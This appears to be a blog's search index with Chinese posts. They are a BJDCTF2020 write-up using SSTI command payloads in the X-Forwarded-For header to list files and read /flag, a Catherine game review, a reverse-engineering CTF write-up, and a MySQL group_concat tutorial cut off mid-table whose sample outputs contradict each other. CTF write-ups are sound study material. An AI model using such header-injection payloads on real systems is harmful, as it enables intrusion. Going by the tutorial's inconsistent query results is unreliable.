<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BJDCTF2020-The mystery of ip</title>
    <url>/BJDCTF2020-The-mystery-of-ip/</url>
    <content><![CDATA[<p>先进入题目给的靶机<br />
<a id="more"></a></p>
<h1 id="审视页面"><a class="anchor" href="#审视页面">#</a> 审视页面</h1>
<p>发现左上角有两个标签: Flag 和 Hint;</p>
<h2 id="hintphp"><a class="anchor" href="#hintphp">#</a> Hint.php</h2>
<p>给出提示从 IP 地址入手.<br />
<img data-src="https://i.loli.net/2021/01/22/f2snd6E1rZ3pywv.png" alt="" /><br />
 那我们就来看看第二个标签.</p>
<h2 id="flagphp"><a class="anchor" href="#flagphp">#</a> Flag.php</h2>
<p>Flag 标签，打开后会给我们一份 IP 地址: 172.16.134.121;<br />
 登录这个 IP 瞧瞧.</p>
<p>使用 bp 抓取 Flag 页面的包；<br />
<img data-src="https://i.loli.net/2021/01/22/yEoaLhXwBFuAg3N.png" alt="" /><br />
 尝试更改一下 IP 地址看看？</p>
<div class="note info">
<p>添加 X-Forwarded-For: 127.0.0.1</p>
</div>
<p><img data-src="https://i.loli.net/2021/01/22/qtWNdmsM8lYQCvb.png" alt="" /></p>
<p>可以看到 IP 地址发生了变化，直接将 127.0.0.1 输出到了页面上；借助搜索引擎我发现一篇<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ3RhbnpoaS9wLzEyMjM4Nzc5Lmh0bWw=">大佬的博客</span>，里面实际验证了这是一种 SSTI 模板注入；</p>
<p><span class="green">尝试构造 payload:</span></p>
<pre><code>X-Forwarded-For: &#123;&#123;system("ls")&#125;&#125;
</code></pre>
<p><img data-src="https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png" alt="" /><br />
发现 flag 文件，利用 cat 拿取 flag;</p>
<p><span class="green">构造 payload:</span></p>
<pre><code>X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
</code></pre>
<p><img data-src="https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png" alt="" /></p>
<p>于是拿到了 flag, 放入题目中 sumbit;yas</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>Catherine</title>
    <url>/Catherine/</url>
    <content><![CDATA[<p>这是一部趣味十足的恋爱惊悚剧，如果你完全不知道这个游戏；那么我在这里放一点 pic, 相信你的多巴胺一定会作出很诚实的反应.</p>
<p><img data-src="https://i.loli.net/2021/02/15/zHXevfh8gZxkLrD.jpg" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/uwNWoay5djJbe6K.jpg" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/nPrdQWOxfaM6R14.jpg" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/LKxDvelEIH4O7jZ.png" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/Jdy8LWDSg4bislx.jpg" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/zr2iMKbRjtQSX8P.png" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/b9hH4tf8XnFaSQo.jpg" alt="" /></p>
<p>如果你和我一样是个自制力 (bingbu) 极强的男人，那么关于婚姻价值观讨论的问题也许会更让你感兴趣.</p>
<h3 id="my-names-vinsent"><a class="anchor" href="#my-names-vinsent">#</a> My Name's Vinsent</h3>
<p>&quot;不想结婚的男人就该去死&quot; 曾经是《凯瑟琳》单人故事当中一个定则，这个献祭仪式持续了至少数百年之久.<br />
 城郊的一隅，有一家叫做 &quot;迷途羔羊&quot; 的酒吧，店里没有禁烟席，除去披萨外没有什么正经的吃的，得益于店长不错的调酒水平，&quot;迷途的羔羊&quot; 还是吸引了不少客人。主角文森特就是其中的一只迷途羔羊。作为一名再就业的 system engineer, 工资不高不低，没有什么特殊技能，外貌平平无常，是个再不能普通的上班族.32 岁的他有一个交往了五年的女友凯瑟琳 (Katherine).<br />
 谈了这么久的恋爱，就是生米也该煮成粥了。凯瑟琳一直在暗示文森特 &quot;到谈婚论嫁的时候了&quot;<br />
<img data-src="https://i.loli.net/2021/02/15/iHk863GfRU4uj7y.png" alt="" /><br />
 可文森特却被这突如其来的催婚而苦恼不已.<br />
 并不是不爱凯瑟琳，文森特只是觉得现在正是为工作而奋斗的大好时光，结婚这等大事应该等到事业有成之后在忙也不急，而且作为男人，他并不希望自己过早地被家庭所束缚，好不容易在成年后脱离父母的掌控，好不容易能在 30 岁有了部分的职业自由，好不容易... 不容易换来的自由他不希望过早地寄托在凯瑟琳的手中，他爱她，但他也希望凯瑟琳能给他想要的空间感；<br />
 疲惫了一天后，文森特来到可以吐露烦恼的地方 --&quot;迷途的羔羊&quot;.<br />
 乔尼，和文森特一起长大的同学。成年后继承了老爹的修理厂，每天都带着小徒弟托比和哥们儿们一起喝酒。只想和还没遇到的 &quot;命中注定的另一半&quot; 结婚，和现在的女朋友没有之后的打算.<br />
 奥兰德，三人组当中唯一早早结婚的一个，做生意失败后和老婆离婚，现在过着潇洒的单身生活，自称 &quot;婚姻就是墓场，我就是现成的例子&quot;.<br />
 文森特将今天早上和凯瑟琳的谈话告诉了他们</p>
<p><img data-src="https://i.loli.net/2021/02/15/pk2zVJH1UINueBh.png" alt="" /><br />
他觉得自己不是讨厌凯瑟琳，只是畏惧婚姻.<br />
 可是，婚姻这种事情，三个大男人怎么能商讨出结果呢...<br />
 奥兰德将话题转移到了他的老同学，保罗身上.<br />
&quot;喂，你知道吗？保罗那家伙... 今天早上死了啊！&quot;<br />
<img data-src="https://i.loli.net/2021/02/15/SdjNhRZ3L2F4VtI.png" alt="" /><br />
 事情发生地出奇就连警方也束手无策。人是在睡觉过程中死掉的，死状极其恐怖，全身如同缩水的纸片，弯曲狰狞.<br />
 正当众人为此诧异时，文森特的手机响了.<br />
<img data-src="https://i.loli.net/2021/02/15/PwGRTUqVXbgC8dx.png" alt="" /><br />
 又是要自己赶紧结婚<br />
...<br />
...<br />
 文森特已经无心继续在酒吧呆下去了.</p>
<h3 id="my-names-catherine"><a class="anchor" href="#my-names-catherine">#</a> My Name's Catherine</h3>
<p><img data-src="https://i.loli.net/2021/02/15/3DzEZn1k5iRgrXS.png" alt="" /><br />
文森特做了一个奇怪的梦：在梦里他和一堆绵羊人不停的往上爬，往上爬；脚下是披着婚纱的怪物追杀，以及靠两脚站立的 &quot;男性&quot; 绵羊的警告:&quot;往上爬，摔下去会死的！&quot;<br />
 真的会死，文森特吓尿了；</p>
<p>真的吓尿了，早晨起来文森特发现自己尿床了.<br />
 与此同时，彻夜未关的电视正插播着 &quot;男性连续离奇死亡&quot; 的新闻。</p>
<p>&quot;这是 ' 女人的诅咒 ' 哟&quot;<br />
文森特想起昨晚路过的艾丽卡听到文森特他们的聊天，掺和进来:&quot; 受到女人诅咒的花心男和出轨男，会因为报应惨死在噩梦当中 &quot;<br />
 小小的酒吧卡座，构成了《凯瑟琳》故事的中心，无论是熟悉的酒友还是陌生的过客，这些男人都是凯瑟琳 (Catherine) 游戏中一份子。对待婚姻的态度让他们夜夜在惊恐中搏命，醒来却又不得不面临着来自生活、工作、另一半的压力.<br />
 文森特与凯瑟琳交往已经有五年了，十分清楚凯瑟琳是个好女人，知道他的咖啡总要加两块方糖，知道他每晚都会和老同学小聚，知道他 32 岁还偶尔尿床的毛病，自己也早就把余生另一半的位置交给了凯瑟琳.<br />
 但是与桌前的要强的女人相比，文森特是完全相反的另一种人。他习惯按照自己的喜好换电脑换手机，习惯和单身哥们插科打诨的自由生活，习惯在单人床上醒来。所以，当 K 瑟琳一脸正经地说出 &quot;结婚后工资卡给我管理，夜间禁止外出，必须有计划花钱&quot; 等等之后，文森特开始畏惧起将来的生活.<br />
 他知道自己应该结婚，但是他不敢结婚.</p>
<p>这是第一次，文森特独自一人在酒吧喝着闷酒.<br />
&quot;我可以坐在你前面吗？&quot; 一阵温柔又带着俏皮的女声在文森特耳畔响起.</p>
<p>或许是无处安置的苦闷，文森特和面前这位才见面的金发女郎谈起了自己的烦心事.</p>
<p><img data-src="https://i.loli.net/2021/02/15/JsgDdEO1VnFCyKX.png" alt="" /><br />
无需墨守成规，生活即是及时行乐，不必为将来忧虑，着手于眼前.<br />
 夹在现实婚姻和夺命噩梦之间动弹不得的文森特，在 stray sheep 遇到了凯瑟琳 (Catherine) 后这才发现，自己生理上对异性的喜好，其实与那个迟早都会结婚的女人完全相反.<br />
<img data-src="https://i.loli.net/2021/02/15/yTE2sWFQaxduf6R.png" alt="" /><br />
<img data-src="https://i.loli.net/2021/02/15/ZcIC4HPRLbF37Mm.png" alt="" /><br />
 而眼前的这名凯瑟琳，无论是样貌还是个性，都是文森特梦寐以求的理想型.</p>
<p>这一晚，文森特梦到了凯瑟琳像是一只披着婚纱的恶鬼追着他不放.</p>
<p><img data-src="https://i.loli.net/2021/02/15/e5Mmt71AIaQsC4n.png" alt="" /><br />
&quot;这一定是意外... 意外... 意外...&quot; 文森特不敢相信即将结婚的自己似乎外遇了。明明对凯瑟琳 (Katherine) 一心一意，却对眼前爱捣蛋的小恶魔无法释怀.</p>
<p>外遇对男人来说只是一夜之萍水，对女人来说却会铭记一生.<br />
<img data-src="https://i.loli.net/2021/02/15/3OHGhg7LWvuRx6U.png" alt="" /></p>
<h3 id="你有点怪怪的"><a class="anchor" href="#你有点怪怪的">#</a> 你有点怪怪的</h3>
<p><img data-src="https://i.loli.net/2021/02/15/c63DX5inJf4QL7H.png" alt="" /><br />
<mark>To be continued</mark></p>
]]></content>
      <categories>
        <category>生活随笔</category>
        <category>GAME</category>
      </categories>
      <tags>
        <tag>凯瑟琳</tag>
      </tags>
  </entry>
  <entry>
    <title>RE-新年快乐</title>
    <url>/EZre/</url>
    <content><![CDATA[<h1 id="新年快乐"><a class="anchor" href="#新年快乐">#</a> 新年快乐</h1>
<p><a id="more"></a></p>
<p><img data-src="https://i.loli.net/2021/01/24/whsWzYRnkfVULpu.png" alt="" /></p>
<p>是叫我们输入一个 flag, 看看就知道没什么卵用；</p>
<p>拖进 IDA 后啥也没弄到，这时我就 (想到) 是不是需要脱壳？？</p>
<h2 id="先脱壳"><a class="anchor" href="#先脱壳">#</a> 先脱壳</h2>
<p><img data-src="https://i.loli.net/2021/01/24/3CDRpBo5OWqVJrA.png" alt="" /></p>
<p>将脱壳后的 exe 程序拖入 IDA 中；<br />
 这时便可以看到脱掉壳的 exe 已经可以浏览函数了；<br />
shift+F12 看一下</p>
<p><img data-src="https://i.loli.net/2021/01/24/ZdnzfDQT4hG9PMs.png" alt="" /></p>
<p>选中到 flag F5 跳转到函数页面分析得知是要我们输入一个字符串；</p>
<p><img data-src="https://i.loli.net/2021/01/24/LnMOhdarKjwcJ4Y.png" alt="" /></p>
<p>且字符串和 str2 比较，相同则得到 flag; 由此得知 flag=<span class="spoiler bulr" title="快走开(╯▔皿▔)╯">flag{HappyNewYear!}</span></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>Re</category>
      </categories>
      <tags>
        <tag>逆向先脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL Group_concat()的用法</title>
    <url>/MySQL-Group-concat-%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>文中使用的例子均在数据库表 db1 下执行<br />
<a id="more"></a></p>
<h2 id="concat函数"><a class="anchor" href="#concat函数">#</a> concat () 函数</h2>
<p>功能：将多个字符串连接成一个字符串（任何一个参数为 null，则返回值为 null）</p>
<ol>
<li>举例</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>name<span class="token punctuation">,</span>score<span class="token punctuation">)</span><span class="token keyword">as</span> info <span class="token keyword">from</span> db1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> info <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span><span class="token number">1</span>小明<span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span><span class="token number">2</span>小王<span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span><span class="token number">3</span>小王<span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span><span class="token number">4</span>小李<span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span><span class="token boolean">NULL</span>  <span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span><span class="token number">6</span>小紫<span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p>第 5 行为 NULL 是因为 db1 表中有一行的 score 值为 null</p>
<ol start="2">
<li>分隔符</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span>name<span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span>score<span class="token punctuation">)</span><span class="token keyword">as</span> info <span class="token keyword">from</span> db1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> info <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">,</span>小明<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span><span class="token number">2</span><span class="token punctuation">,</span>小王<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span><span class="token number">3</span><span class="token punctuation">,</span>小王<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span><span class="token number">4</span><span class="token punctuation">,</span>小李<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span><span class="token boolean">NULL</span>    <span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span><span class="token number">6</span><span class="token punctuation">,</span>小紫<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p>虽然分隔符是放上去了，但却是一个一个加上去的，着实有些麻烦。有什么更加简便的方法呢？</p>
<h2 id="concat_ws函数"><a class="anchor" href="#concat_ws函数">#</a> concat_ws () 函数</h2>
<p>功能：和 concat () 一样，将多个字符串连接成一个字符串；<mark>但是可以一次性指定分隔符</mark></p>
<ol>
<li>举例</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>name<span class="token punctuation">,</span>score<span class="token punctuation">)</span><span class="token keyword">as</span> info <span class="token keyword">from</span> db1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> info <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span><span class="token number">1</span><span class="token punctuation">,</span>小明<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span><span class="token number">2</span><span class="token punctuation">,</span>小王<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span><span class="token number">3</span><span class="token punctuation">,</span>小王<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span><span class="token number">4</span><span class="token punctuation">,</span>小李<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span><span class="token boolean">NULL</span>    <span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span><span class="token number">6</span><span class="token punctuation">,</span>小紫<span class="token punctuation">,</span><span class="token number">0</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="group_concat函数"><a class="anchor" href="#group_concat函数">#</a> group_concat () 函数</h2>
<p>先理解一下 group by，实际上就是分类汇总，把相同的归为一类。<br />
关于 group by 的使用可以参考下篇博文：<br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21hcnkxOTkyMDQxMC9hcnRpY2xlL2RldGFpbHMvNzYzOTgwNTA=">浅析 SQL 中 Group By 的使用</span></p>
<ol>
<li>举例</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> name<span class="token punctuation">,</span><span class="token function">min</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">from</span> db1 <span class="token keyword">group</span> <span class="token keyword">by</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+---+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> name <span class="token operator">|</span> <span class="token function">min</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+---+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>        <span class="token operator">|</span>      <span class="token number">7</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>krytios <span class="token operator">|</span>      <span class="token number">8</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>lxscloud<span class="token operator">|</span>      <span class="token number">9</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span> 小李   <span class="token operator">|</span>      <span class="token number">3</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>gundum  <span class="token operator">|</span>      <span class="token number">2</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span>  小紫  <span class="token operator">|</span>      <span class="token number">1</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+---+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p>下面我来解释一下这段是什么意思：</p>
<p>首先看 select name,min (id) from db1，就是查询 db1 库里 name 和最小 id 的所有数据；</p>
<p>其次 group by name 就是把 name 相同的的人中最小的 id 列出。</p>
<ol start="2">
<li>查询 name 相同的人的所有的 id 呢？</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> name<span class="token punctuation">,</span><span class="token function">min</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">from</span> db1 <span class="token keyword">order</span> <span class="token keyword">by</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+---+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> name <span class="token operator">|</span> <span class="token function">min</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+---+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>        <span class="token operator">|</span>      <span class="token number">7</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>kyritios<span class="token operator">|</span>      <span class="token number">8</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>lxscloud<span class="token operator">|</span>      <span class="token number">9</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span>kyritios<span class="token operator">|</span>      <span class="token number">3</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>lxscloud<span class="token operator">|</span>      <span class="token number">2</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span>  小紫  <span class="token operator">|</span>      <span class="token number">1</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+---+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="3">
<li>更进一步的</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> name<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">from</span> db1 <span class="token keyword">group</span> <span class="token keyword">by</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> name <span class="token operator">|</span> group_concat<span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>        <span class="token operator">|</span>      <span class="token number">7</span>    <span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>kyritios<span class="token operator">|</span>      <span class="token number">8</span>    <span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>lxscloud<span class="token operator">|</span>      <span class="token number">9</span>    <span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span>小王    <span class="token operator">|</span>      <span class="token number">9</span><span class="token punctuation">,</span><span class="token number">8</span>  <span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>小明    <span class="token operator">|</span>      <span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span>  小紫  <span class="token operator">|</span>      <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><p>使用 group_concat () 和 group by 显示相同名字的人的 id 号</p>
<p>若是想要 id 号排序呢？</p>
<ol start="4">
<li>走着！！</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> name<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id <span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token keyword">desc</span> separator <span class="token string">'_'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> db1 <span class="token keyword">group</span> <span class="token keyword">by</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------++------+------++------+------++------+------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> name <span class="token operator">|</span> group_concat<span class="token punctuation">(</span>id <span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token keyword">desc</span> separator <span class="token string">'_'</span><span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------++------+------++------+------++------+------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>        <span class="token operator">|</span> <span class="token number">7</span>                                             <span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>kyritios<span class="token operator">|</span> <span class="token number">8</span>                                             <span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>lxscloud<span class="token operator">|</span> <span class="token number">9</span>                                             <span class="token operator">|</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">|</span>小王    <span class="token operator">|</span> <span class="token number">3</span>                                              <span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">|</span>小明    <span class="token operator">|</span> <span class="token number">2</span>_5_6                                          <span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">|</span>  小紫  <span class="token operator">|</span> <span class="token number">1</span>_7                                            <span class="token operator">|</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------++------+------++------+------++------+------+</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="5">
<li>还没完</li>
</ol>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>mysql<span class="token operator">></span> <span class="token keyword">select</span> name<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span> concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>score<span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token punctuation">)</span> <span class="token keyword">from</span> db1 <span class="token keyword">group</span> <span class="token keyword">by</span> name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------++------+------++------+------++------+------+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">|</span> name <span class="token operator">|</span> group_concat<span class="token punctuation">(</span> concat_ws<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span>score<span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> id <span class="token punctuation">)</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">+</span><span class="token comment">------+------+------++------+------++------+------++------+------+</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">|</span>        <span class="token operator">|</span> <span class="token number">7</span><span class="token operator">-</span><span class="token number">0</span>                                                <span class="token operator">|</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">|</span>kyritios<span class="token operator">|</span> <span class="token number">8</span><span class="token operator">-</span><span class="token number">80</span>                                                <span class="token operator">|</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">|</span>lxscloud<span class="token operator">|</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">0</span>                                                <span class="token 